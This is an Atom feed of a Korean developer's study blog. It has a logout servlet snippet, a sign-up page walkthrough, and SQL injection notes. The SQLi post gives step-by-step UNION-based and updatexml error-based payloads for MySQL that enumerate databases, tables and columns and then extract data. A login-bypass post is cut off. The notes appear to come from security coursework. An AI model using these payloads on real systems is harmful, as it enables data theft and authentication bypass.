<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-04-24T03:21:04+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoiZmxvd2NoYXJ0IFREXG5BW-uhnOq3uOyduCDsi5zrj4RdIC0tPiBCW-uhnOq3uOyduCDrsKnsi51dXG5CIC0tPiB87IS47IWYIOygleuztCDsl4bsnYx8IENb66Gc6re47JWE7JuDIOyDge2DnOyXkOyEnCDroZzqt7jsnbhdXG5CIC0tPiB87IS47IWYIOygleuztCDsnojsnYx8IERb7IS47IWYIOygleuztCDtmZXsnbhdXG5EIC0tPiBFW-q4sOqwhCDrp4zro4wg7ZmV7J24XVxuRSAtLT4gfFl8IENcbkUgLS0-IHxOfCBGW-yEuOyFmElE66GcIOygleuztCDqsIDsoLjsmKTquLBdXG5GIC0tPiBHW-yEseqztV1cbkMgLS0-IEhbSUQgLCBQV0Qg7J6F66ClXVxuSCAtLT4gSVvshLjshZjsoJXrs7Qg7IOd7ISxXVxuSSAtLT4gRyIsIm1lcm1haWQiOm51bGx9" /></p>

<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAo67iM65287Jqw7KCAKSAtPj4g7ISc67KEIDog66Gc6re47JWE7JuDIOyalOyyrVxu7ISc67KEIC0-PiDshJzrsoQgOiBzZXNzaW9uIGlkIOyCreygnFxu7ISc67KEIC0-PiDsgqzsmqnsnpAo67iM65287Jqw7KCAKSA6IOuhnOq3uOyduCDtjpjsnbTsp4Dso7zshowg66as64uk7J2066CJ7Yq4IOydkeuLtVxu7IKs7Jqp7J6QKOu4jOudvOyasOyggCkgLT4-IOyEnOuyhCA6IOuhnOq3uOyduCDtjpjsnbTsp4Ag7JqU7LKtXG7shJzrsoQgLT4-IOyCrOyaqeyekCjruIzrnbzsmrDsoIApIDog66Gc6re47J24IO2OmOydtOyngCDsnZHri7UiLCJtZXJtYWlkIjpudWxsfQ" /></p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">com.mingyu2.login</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Logout</span> <span class="kd">extends</span> <span class="nc">HttpServlet</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="nd">@Override</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doGet</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ServletException</span><span class="o">,</span> <span class="nc">IOException</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">uri</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getRequestURI</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 로그아웃 요청이 아니면 실패</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(!</span><span class="n">uri</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"/user-logout"</span><span class="o">)){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kd">super</span><span class="o">.</span><span class="na">doGet</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">session</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getSession</span><span class="o">(</span><span class="kc">false</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">session</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">session</span><span class="o">.</span><span class="na">invalidate</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">response</span><span class="o">.</span><span class="na">sendRedirect</span><span class="o">(</span><span class="s">"/sign_in_page"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>
<blockquote>
  <p>test</p>
</blockquote>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">SQL Injection 과정정리</title><link href="http://localhost:4000/SQLi%EB%B0%A9%EB%B2%95/" rel="alternate" type="text/html" title="SQL Injection 과정정리" /><published>2023-04-24T00:00:00+09:00</published><updated>2023-04-24T23:13:00+09:00</updated><id>http://localhost:4000/SQLi%EB%B0%A9%EB%B2%95</id><content type="html" xml:base="http://localhost:4000/SQLi%EB%B0%A9%EB%B2%95/"><![CDATA[<h3 id="환경">환경</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- MYSQL 서버
</code></pre></div></div>

<h3 id="질의문의-결과가-화면에-보일때">질의문의 결과가 화면에 보일때.</h3>
<hr />
<ul>
  <li>게시판(글이 화면에 나옴), 회원정보(마이페이지), 주소검색, 검색페이지 등</li>
</ul>

<h5 id="sqli-과정">SQLi 과정</h5>
<ol>
  <li>서버에서 어떤 질의문을 사용하는지 추측하기.
    <ul>
      <li>질의문 추측 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명 like '%----%' ...</code></li>
    </ul>
  </li>
  <li><strong>SQL Injection</strong> 취약점 존재하는지 확인하기.
    <ul>
      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명 like '%test%' and '1%'='1%' ...</code></li>
      <li>입력 = <code class="language-plaintext highlighter-rouge">test%' and '1%'='1</code></li>
    </ul>
  </li>
  <li>컬럼수 찾기.
    <ul>
      <li><code class="language-plaintext highlighter-rouge">order by</code> 를 이용하여 1씩 증가 시키면서 컬럼수를 찾아준다.</li>
      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명 like '%test%' order by 1 -- %' ...</code></li>
      <li>입력 = <code class="language-plaintext highlighter-rouge">test%' order by 1 -- </code></li>
    </ul>
  </li>
  <li>data 출력 위치 파악하기.
    <ul>
      <li>위에서 찾은 컬럼수를 이용하여 data 출력 위치 파악하기.</li>
      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명 like '%test%' union select '1','2','3','4' from dual -- %' ...</code></li>
      <li>입력 = <code class="language-plaintext highlighter-rouge">test%' union select '1','2','3','4' from dual -- </code></li>
    </ul>
  </li>
  <li>database 이름 출력하기.
    <ul>
      <li>위에서 파악한 출력위치를 이용하여 DB 이름을 알아보자.</li>
      <li><code class="language-plaintext highlighter-rouge">select database() from dual</code> 명령을 이용하면 현재 DB 명이 나온다.</li>
      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명 like '%test%' union select '1',database(),'3','4' from dual -- %' ...</code></li>
      <li>입력 = <code class="language-plaintext highlighter-rouge">test%' union select '1',database(),'3','4' from dual -- </code></li>
    </ul>
  </li>
  <li>table 이름 출력하기.
    <ul>
      <li>위에서 파악한 DB이름을 이용하여 존재하는 테이블명을 알아보자.</li>
      <li><code class="language-plaintext highlighter-rouge">select table_name from information_schema.tables where table_schema='DB명'</code> 명령을 이용하면 테이블명을 알 수 있다.</li>
      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명 like '%test%' union select '1',table_name,'3','4' from from information_schema.tables where table_schema='DB명' -- %' ...</code></li>
      <li>입력 = <code class="language-plaintext highlighter-rouge">test%' union select '1',table_name,'3','4' from from information_schema.tables where table_schema='DB명' -- </code></li>
    </ul>
  </li>
  <li>column 이름 출력하기.
    <ul>
      <li>위에서 파악한 table 이름을 이용하여 table의 컬럼명을 알아보자.</li>
      <li><code class="language-plaintext highlighter-rouge">select column_name from information_schema.columns where table_name='테이블명'</code> 명령을 이용하면 해당 table의 컬럼명을 알 수 있다.</li>
      <li>질의문 = `select xxxx from xxx where 컬럼명 like ‘%test%’ union select ‘1’,column_name,’3’,’4’ from information_schema.columns where table_name=’테이블명’ – %’ …</li>
      <li>입력 = <code class="language-plaintext highlighter-rouge">test%' union select '1',column_name,'3','4' from information_schema.columns where table_name='테이블명' -- </code></li>
    </ul>
  </li>
  <li>정보 빼오기.
    <ul>
      <li>위에서 파악한 table명과 해당 table에 대한 column 명을 이용하여 정보를 빼오자!</li>
      <li><code class="language-plaintext highlighter-rouge">select column명 from table명</code> 명령을 이용하여 저장된 정보를 알 수 있다.</li>
      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명 like '%test%' union select '1',column명,'3','4' from table명 -- %' ...</code></li>
      <li>입력 = <code class="language-plaintext highlighter-rouge">test%' union select '1',column명,'3','4' from table명 -- </code></li>
    </ul>
  </li>
</ol>

<p><br /><br /></p>
<h3 id="질의문의-결과가-화면에-안보일때">질의문의 결과가 화면에 안보일때.</h3>
<hr />
<ul>
  <li>로그인, 아이디 중복 체크.</li>
</ul>

<h5 id="조건">조건</h5>
<ul>
  <li>Error 메시지가 화면에 출력될때. ( <strong>Error Bases SQL Injection</strong> )</li>
</ul>

<h5 id="sqli-과정-1">SQLi 과정</h5>
<ol>
  <li>서버에서 어떤 질의문을 사용하는지 추측하기.
    <ul>
      <li>질의문 추측 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명='----' ...</code></li>
    </ul>
  </li>
  <li>오류 발생 확인하기. ( db 에러인지 확인하기 )
    <ul>
      <li>입력 = <code class="language-plaintext highlighter-rouge">' asd</code></li>
      <li><strong>syntax error 발생(문법 에러)</strong> 가 발생하는 것을 확인이 가능한지 본다.</li>
    </ul>
  </li>
  <li>Error Based SQL Injection Function 동작하는지 확인하기.
    <ul>
      <li>Syntax error (문법에러) : 문법 틀리면 안됨. 컴파일 할 때 잡아낸다.</li>
      <li>논리에러 : 실행이된다.</li>
      <li>즉 우리는 논리에러를 발생시켜야 한다.</li>
      <li><strong>updatexml</strong> 함수를 이용하자!</li>
      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명='1' and updatexml(null, concat(0x3a,'test'), null) and '1'='1' ...</code></li>
      <li>입력 = <code class="language-plaintext highlighter-rouge">1' and updatexml(null, concat(0x3a,'test'), null) and '1'='1</code></li>
      <li><code class="language-plaintext highlighter-rouge">XPATH syntax error: ':test'</code> 에러를 볼 수 있다.</li>
      <li><code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명='1' and updatexml(null, concat(0x3a,(SQL)), null) and '1'='1' ...</code> test 대신 질의문을 넣어주면 된다.</li>
    </ul>
  </li>
  <li>Database 이름 출력하기.
    <ul>
      <li><code class="language-plaintext highlighter-rouge">select database() from dual</code>  로 DB 명 찾기</li>
      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명='1' and updatexml(null, concat(0x3a,(select database() from dual)), null) and '1'='1' ...</code></li>
      <li>입력 = <code class="language-plaintext highlighter-rouge">1' and updatexml(null, concat(0x3a,(select database() from dual)), null) and '1'='1</code></li>
    </ul>
  </li>
  <li>table 이름 출력하기.
    <ul>
      <li><code class="language-plaintext highlighter-rouge">select table_name from information_schema.tables where table_schema='DB명' limit 0,1</code> 로 table 명 찾기.</li>
      <li>오류는 하나의 데이터만 보여줄 수 있다. 따라서 출력을 1개로 제한하였다.</li>
      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명='1' and updatexml(null, concat(0x3a,(select table_name from information_schema.tables where table_schema='DB명' limit 0,1)), null) and '1'='1' ...</code></li>
      <li>입력 = <code class="language-plaintext highlighter-rouge">1' and updatexml(null, concat(0x3a,(select table_name from information_schema.tables where table_schema='DB명' limit 0,1)), null) and '1'='1</code></li>
      <li><code class="language-plaintext highlighter-rouge">limit</code> 를 조절하면서 원하는 테이블명을 찾는다.</li>
    </ul>
  </li>
  <li>column 이름 출력하기.
    <ul>
      <li><code class="language-plaintext highlighter-rouge">select column_name from information_schema.columns where table_name='테이블명' limit 0,1</code> 로 table에 해당하는 column명 찾기.</li>
      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명='1' and updatexml(null, concat(0x3a,(select column_name from information_schema.columns where table_name='테이블명' limit 0,1)), null) and '1'='1' ...</code></li>
      <li>입력 = <code class="language-plaintext highlighter-rouge">1' and updatexml(null, concat(0x3a,(select column_name from information_schema.columns where table_name='테이블명' limit 0,1)), null) and '1'='1</code></li>
    </ul>
  </li>
  <li>정보 빼오기
    <ul>
      <li>위에서 파악한 table명과 해당 table에 대한 column 명을 이용하여 정보를 빼오자!</li>
      <li><code class="language-plaintext highlighter-rouge">select column명 from table명 limit 0,1</code> 명령을 이용하여 저장된 정보를 알 수 있다.</li>
      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명='1' and updatexml(null, concat(0x3a,(select column명 from table명 limit 0,1)), null) and '1'='1' ...</code></li>
      <li>입력 = <code class="language-plaintext highlighter-rouge">1' and updatexml(null, concat(0x3a,(select column명 from table명 limit 0,1)), null) and '1'='1</code></li>
    </ul>
  </li>
</ol>]]></content><author><name>Jung MinGyu</name></author><category term="Mysql DB" /><category term="DB" /><category term="sql injection" /><summary type="html"><![CDATA[sql injection 보다 쉽게 할 수 있는 과정을 정리하였다.]]></summary></entry><entry><title type="html">웹 서버 만들기 (8) 회원가입 구현</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C8/" rel="alternate" type="text/html" title="웹 서버 만들기 (8) 회원가입 구현" /><published>2023-04-20T00:00:00+09:00</published><updated>2023-04-20T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C8</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C8/"><![CDATA[<h2 id="회원-가입-버튼-누르기-전">회원 가입 버튼 누르기 전</h2>

<p><br /></p>
<h3 id="회원가입-버튼-추가">회원가입 버튼 추가</h3>
<hr />
<blockquote>
  <p><strong>로그인 페이지에 회원가입 버튼 추가</strong><br /><img src="https://user-images.githubusercontent.com/31990118/233329577-363a25da-eafd-46a5-8eb1-0d83f5d75943.png" alt="Pasted image 20230420151719" /></p>
</blockquote>

<blockquote>
  <p><strong>회원가입 버튼 부분(클라이언트)</strong><br /><script src="https://gist.github.com/MinGyu2/e0ee562997986b0cc8fd8d4c1cd4433a.js"></script></p>
  <ul>
    <li>회원 가입 페이지로 연결해준다.</li>
  </ul>
</blockquote>

<blockquote>
  <p><strong>회원가입 페이지 연결(서버)</strong></p>
  <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">String</span> <span class="n">formAction</span> <span class="o">=</span> <span class="s">"/sign_in_page/authentication"</span><span class="o">;</span>
<span class="n">request</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"formAction"</span><span class="o">,</span> <span class="n">formAction</span><span class="o">);</span>
<span class="n">request</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"signUpLink"</span><span class="o">,</span> <span class="s">"/sign_in_page/sign_up_page"</span><span class="o">);</span>
<span class="c1">// session id 가 만료되었거나 없어서 새롭게 로그인 해 줘야한다.</span>
<span class="c1">// 로그인 페이지를 보여준다.</span>
<span class="n">gotoForwardPage</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">,</span> <span class="s">"/WEB-INF/sign_in_page/sign_in_page.jsp"</span><span class="o">);</span>
</code></pre></div>  </div>
  <ul>
    <li>서버에서 <code class="language-plaintext highlighter-rouge">signUpLink</code> 변수를 넣은후 <code class="language-plaintext highlighter-rouge">sign_in_page.jsp</code> 로 forward 해야지만 회원가입 링크 부분이 완성이 된다.</li>
    <li>만약 signUpLink 변수를 안주면 회원가입 버튼이 안보인다.<br /><img src="https://user-images.githubusercontent.com/31990118/233330281-cb605b66-ab9a-4335-bd36-b76aea157fde.png" alt="Pasted image 20230420153007" /></li>
  </ul>
</blockquote>

<p><br /></p>
<h3 id="회원가입-페이지">회원가입 페이지</h3>
<hr />
<blockquote>
  <p>회원가입 페이지<br /><img src="https://user-images.githubusercontent.com/31990118/233330449-37b9eb7a-5c2e-424c-a505-158e2ea7230c.png" alt="Pasted image 20230420153118" /></p>
</blockquote>

<blockquote>
  <p>구성</p>
  <ul>
    <li><code class="language-plaintext highlighter-rouge">Username</code>
      <ul>
        <li>유저 아이디를 입력한다.</li>
      </ul>
    </li>
    <li><code class="language-plaintext highlighter-rouge">중복확인</code>
      <ul>
        <li>서버로 유저가 입력한 아이디를 보내 중복하는 아이디인지 확인한다.</li>
      </ul>
    </li>
    <li><code class="language-plaintext highlighter-rouge">Email</code>
      <ul>
        <li>유저 이메일을 입력한다.</li>
        <li>이메일 패턴에 맞게 입력하여야 한다.</li>
      </ul>
    </li>
    <li><code class="language-plaintext highlighter-rouge">Password</code>
      <ul>
        <li>유저 비밀번호를 입력한다.</li>
      </ul>
    </li>
    <li><code class="language-plaintext highlighter-rouge">Password 확인</code>
      <ul>
        <li>유저 비밀번호를 동일하게 입력한다.</li>
      </ul>
    </li>
    <li><code class="language-plaintext highlighter-rouge">회원가입</code>
      <ul>
        <li>중복확인, 이메일 패턴 일치 여부, 비밀번호 일치 여부를 확인한 후 각각 입력한 데이터를 서버로 전송한다.</li>
      </ul>
    </li>
  </ul>
</blockquote>

<p><br /></p>
<h3 id="아이디-중복-확인">아이디 중복 확인</h3>
<hr />

<blockquote>
  <p><strong>유저 아이디 중복 확인 (클라이언트)</strong><br /><script src="https://gist.github.com/MinGyu2/05f9fea7bbc9fab773e3fa6ce86fa623.js"></script></p>
  <ul>
    <li>중복확인 버튼을 누르면 <code class="language-plaintext highlighter-rouge">Http get</code> 요청을 통해 <code class="language-plaintext highlighter-rouge">username</code>에 사용자가 입력한 id를 넣어 중복확인 서버 주소를 이용하여 보낸다.</li>
    <li>서버에서 보내온 응답을 통해 아이디가 중복하는지 확인한다.<br /><img src="https://user-images.githubusercontent.com/31990118/233331834-0ad61a19-546a-418d-a474-c6fce7c81f2f.png" alt="Pasted image 20230420155201" /><br /><img src="https://user-images.githubusercontent.com/31990118/233331879-4bf2dff8-c9e8-4d3c-98b8-03ab84536a4a.png" alt="Pasted image 20230420155213" /></li>
  </ul>
</blockquote>

<blockquote>
  <p><strong>유저 아이디 중복 확인 (서버)</strong><br /><script src="https://gist.github.com/MinGyu2/98d645f481a935817b22cbeb249f7e08.js"></script></p>
  <ul>
    <li>클라이언트에서 보낸 <code class="language-plaintext highlighter-rouge">username</code>을 확인해 볼 수 있다.</li>
    <li><code class="language-plaintext highlighter-rouge">LoginAuthentication.isExistUserName(getServletContext(), username);</code> 를 통해 존재하는 유저인지 판단할 수 있다.<br /><script src="https://gist.github.com/MinGyu2/738f5d2240625fccce92b5213fcaabb3.js"></script></li>
  </ul>
</blockquote>

<blockquote>
  <p><strong>UsersDAO</strong> class에서 isExistUserName 함수 부분 코드<br /><script src="https://gist.github.com/MinGyu2/363caaa55ac904382e56c801dcce6b35.js"></script></p>
  <ul>
    <li>이미 존재하는 유저면 <code class="language-plaintext highlighter-rouge">true</code>를 리턴하고 존재안하는 유저면 <code class="language-plaintext highlighter-rouge">false</code>를 리턴한다.</li>
  </ul>
</blockquote>

<blockquote>
  <p><strong>회원가입 JSP 전체 코드(클라이언트)</strong><br /><script src="https://gist.github.com/MinGyu2/d8e184b74e83a72c4772e20e6c42d159.js"></script></p>
</blockquote>

<p><br /></p>
<h3 id="이메일-형식인지-확인">이메일 형식인지 확인</h3>
<hr />
<blockquote>
  <p><strong>자바스크립트를 통해 이메일 형식인지 확인하다.</strong><br /><script src="https://gist.github.com/MinGyu2/485eceb2ce9abaf1c97ef67bcf0bc371.js"></script></p>
  <ul>
    <li>이메일을 입력하고 다음 입력창으로 넘어가면 <code class="language-plaintext highlighter-rouge">onchange='email_change()'</code> 옵션을 통해 자동으로 위의 함수가 실행된다.</li>
    <li>정규식을 통해 이메일 형식인지 확인한다.<br /><img src="https://user-images.githubusercontent.com/31990118/233336731-a2be5db6-6395-469e-ad5c-b5d481f752fe.png" alt="image" /></li>
  </ul>
</blockquote>

<p><br /></p>
<h3 id="비밀번호-일치-확인">비밀번호 일치 확인</h3>
<hr />
<blockquote>
  <p><strong>자바스크립트를 통해 비밀번호가 서로 일치하는지 확인한다.</strong><br /><script src="https://gist.github.com/MinGyu2/ec8eb649562e27a5f05c92c7b92b50e3.js"></script></p>
  <ul>
    <li>비밀번호를 입혁하고 다음 입력창으로 넘어가면 <code class="language-plaintext highlighter-rouge">onchange='pwd_confirm()'</code> 옵션을 통해 자동으로 위의 함수가 실행된다.</li>
    <li>두개의 비밀번호를 비교하여 일치하면 성공이고 다르면 “일치안함” 메세지를 사용자에게 보여준다.<br /><img src="https://user-images.githubusercontent.com/31990118/233336814-d63b3904-17ad-4b2e-9985-206b29f1a483.png" alt="image" />
<br /><img src="https://user-images.githubusercontent.com/31990118/233337192-9757ab02-99b7-48ae-b153-1fca92fbdbe6.png" alt="image" /></li>
  </ul>
</blockquote>

<p><br /><br /></p>
<h2 id="회원가입-버튼-누른-후">회원가입 버튼 누른 후</h2>

<p><br /></p>
<h3 id="회원가입-클라이언트">회원가입 (클라이언트)</h3>
<hr />
<blockquote>
  <p><strong>회원가입 버튼 누른 후 동작 이벤트</strong><br /><script src="https://gist.github.com/MinGyu2/31a2b857fcfac7617b3cbfb255089626.js"></script></p>
  <ul>
    <li>회원정보를 전부 입력한 후 <strong>회원가입</strong> 버튼을 누르면 <code class="language-plaintext highlighter-rouge">onclick="sign_up()"</code> 옵션에 의해 위의 함수가 동작한다.</li>
    <li>서버로 입력한 정보를 보내기전 id 중복 확인을 했는지, email 형식이 맞는지, 비밀번호가 서로 일치하는지 확인한다.</li>
    <li>모두 통과가 되면 post 형식으로 입력한 데이터를 서버로 전달한다.</li>
    <li>자바스크립트에서 post 형식으로 전송하는 방법은 없다. 따라서 form과 input 요소를 만들어주고 body에 추가한 후 post 전송을 해 줘야한다.</li>
  </ul>
</blockquote>

<p><br /></p>
<h3 id="회원가입-서버">회원가입 (서버)</h3>
<hr />
<blockquote>
  <p><strong>회원가입</strong><br /><script src="https://gist.github.com/MinGyu2/274abc0e913bf1d8f71e71363ec033dd.js"></script></p>
  <ul>
    <li>서버는 클라이언트에서 post 전송한 <code class="language-plaintext highlighter-rouge">아이디</code>, <code class="language-plaintext highlighter-rouge">이메일</code>, <code class="language-plaintext highlighter-rouge">비밀번호</code>, <code class="language-plaintext highlighter-rouge">비밀번호 확인</code>을 받는다.</li>
    <li>SignUp 클래스의 <code class="language-plaintext highlighter-rouge">아이디</code>, <code class="language-plaintext highlighter-rouge">이메일</code>, <code class="language-plaintext highlighter-rouge">비밀번호</code>, <code class="language-plaintext highlighter-rouge">비밀번호 확인</code>를 인자로 받는 createUser 함수를  이용하여 유저를 만들어준다.</li>
    <li>계정생성에 실패를 하면 <code class="language-plaintext highlighter-rouge">fail</code> 경고 창을 보여준다. 그 다음 회원가입 창으로 다시 돌아온다.<br /><img src="https://user-images.githubusercontent.com/31990118/233332309-06785554-751e-4e06-9d21-b7f836176f65.png" alt="Pasted image 20230420180533" />
<br /><img src="https://user-images.githubusercontent.com/31990118/233332365-854571a6-47ef-41b4-80dd-6f1a33fde2fa.png" alt="Pasted image 20230420180559" /></li>
    <li>계정생성에 성공하면 success 창을 보여준다. 그 다음 로그인 창으로 이동한다.<br /><img src="https://user-images.githubusercontent.com/31990118/233332463-b75b9e82-b55c-4e9e-8feb-1f6c17f021b4.png" alt="Pasted image 20230420182057" />
<br /><img src="https://user-images.githubusercontent.com/31990118/233332511-ce87dd92-3a9c-4710-abca-cbe0bd1f6c28.png" alt="Pasted image 20230420182109" /></li>
  </ul>
</blockquote>

<p><br /><br /></p>
<h2 id="전체코드">전체코드</h2>

<blockquote>
  <p><strong>로그인 페이지 전체 코드</strong><br /><script src="https://gist.github.com/MinGyu2/3212b923469a3b72b67a13e6f6b4d51c.js"></script></p>
</blockquote>

<blockquote>
  <p><strong>LoginAuthentication 클래스 코드</strong> <br /><script src="https://gist.github.com/MinGyu2/a23d33cdf3ea3337b87849d774a01149.js"></script></p>
</blockquote>

<blockquote>
  <p><strong>UsersDAO 클래스 코드</strong><br /><script src="https://gist.github.com/MinGyu2/af111b0e426e4b9b4067bd1e4e88535f.js"></script></p>
</blockquote>

<blockquote>
  <p><strong>SignUp 클래스 코드</strong><br /><script src="https://gist.github.com/MinGyu2/7025dc86b1a157e32f024cfd84f52c34.js"></script></p>
</blockquote>

<p><br /><br /></p>
<h3 id="참고-사이트">참고 사이트</h3>
<hr />
<ul>
  <li><a href="https://www.baeldung.com/java-email-validation-regex">Email Validation in Java</a></li>
  <li><a href="https://yceffort.kr/2020/01/think-about-fetch">자바스크립트에서 http 요청하기 - fetch에 대한 고찰 – yceffort</a></li>
  <li><a href="https://kang-james.tistory.com/entry/JSP-%EC%95%84%EC%9D%B4%EB%94%94-%EC%A4%91%EB%B3%B5-%EC%B2%B4%ED%81%AC-%EA%B8%B0%EB%8A%A5-%EA%B5%AC%ED%98%84-%EB%8F%99%EA%B8%B0-%EB%B0%A9%EC%8B%9D">JSP 아이디 중복 체크 기능 구현 동기 방식 (tistory.com)</a></li>
  <li><a href="https://www.freecodecamp.org/korean/news/javascripteseo-gajang-jal-alryeojin-http-yoceong-bangbeob-2/">JavaScript에서 가장 잘 알려진 HTTP 요청 방법 (freecodecamp.org)</a></li>
  <li><a href="https://cocoon1787.tistory.com/700">회원가입 창 만들기 (HTML, CSS, JS / 입력형식체크, 문자인증 기능추가)</a></li>
  <li><a href="https://imthekingofcoding.tistory.com/30">JavaScript - 이메일 유효성 검사 (회원가입) (tistory.com)</a></li>
  <li><a href="https://blog.naver.com/PostView.nhn?blogId=seonghun7304&amp;logNo=221583410491">location href를 POST로 보내는 방법</a></li>
  <li><a href="http://www.oncode.co.kr/onbr/brd/board/?pgk=/tip/board/view/1/275&amp;lang=ko">CSS div 안보이게 하는 방법, div hidden, display none</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="Web" /><category term="Oracle DB" /><category term="Java" /><category term="Servlet" /><category term="JSP" /><summary type="html"><![CDATA[회원가입 구현하기.]]></summary></entry><entry><title type="html">SQL Injection 로그인 우회</title><link href="http://localhost:4000/SQLInjection/" rel="alternate" type="text/html" title="SQL Injection 로그인 우회" /><published>2023-04-19T00:00:00+09:00</published><updated>2023-04-19T23:13:00+09:00</updated><id>http://localhost:4000/SQLInjection</id><content type="html" xml:base="http://localhost:4000/SQLInjection/"><![CDATA[<h2 id="sql-injection-이란">SQL Injection 이란?</h2>
<ul>
  <li>sql 질의문을 삽입하는 공격이다. 즉 sql 질의문에 악의적인 코드를 배치하는 공격이다.</li>
  <li>웹 해킹 기술중 하나이다.</li>
</ul>

<blockquote>
  <p>목적</p>
  <ul>
    <li>정보 유출</li>
    <li>저장된 데이터 유출 및 조작</li>
    <li>인증 우회</li>
  </ul>
</blockquote>

<blockquote>
  <p>실습 환경</p>
  <ul>
    <li>DB 서버 : Rocky-8.7</li>
    <li>DB 버전 : oracle-database-xe-21c</li>
  </ul>
</blockquote>

<blockquote>
  <p><strong>members</strong> 테이블 구조</p>
</blockquote>

<table>
  <thead>
    <tr>
      <th>sid</th>
      <th>id</th>
      <th>password</th>
      <th>email</th>
      <th>info</th>
      <th>hashpwd</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>integer PRIMARY KEY</td>
      <td>VARCHAR(60)</td>
